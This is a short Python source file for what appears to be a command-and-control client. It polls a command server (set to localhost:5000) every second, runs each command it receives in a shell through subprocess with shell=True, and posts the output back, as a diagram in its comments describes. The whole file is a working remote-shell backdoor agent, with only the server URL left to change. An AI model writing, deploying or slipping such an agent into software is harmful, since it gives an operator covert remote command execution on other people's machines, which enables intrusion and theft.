import requests
import subprocess
import time


class Client:

    def __init__(self):
        
        self.url = "http://127.0.0.1:5000/"
        self.client_id = ""
        #experimental feature
    
    #             cmd ---->
    # (control panel) <-> (command center) <-> (client)
    #                                     <---- output
    # client cmd format: (client_id):msg
    def send(self, msg : str):
        msg = f"{self.client_id}:{msg}"
        req = requests.post(self.url, data={"msg":msg, "u":1})

    def recv(self : str):
        req = requests.get(self.url, params={"u":1})
        return req.text

    def exec(self, cmd):
        proc = subprocess.run(cmd, 
                            shell=True,
                            stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True)
        return proc.stdout + proc.stderr

    def recv_exec_send(self):
        cmd = self.recv()
        if cmd:
            output = self.exec(cmd)
            self.send(output)
            return output
        return

    def main(self):

        while True:
            time.sleep(1)
            output = self.recv_exec_send()
            print(output)
            
client = Client()
client.main()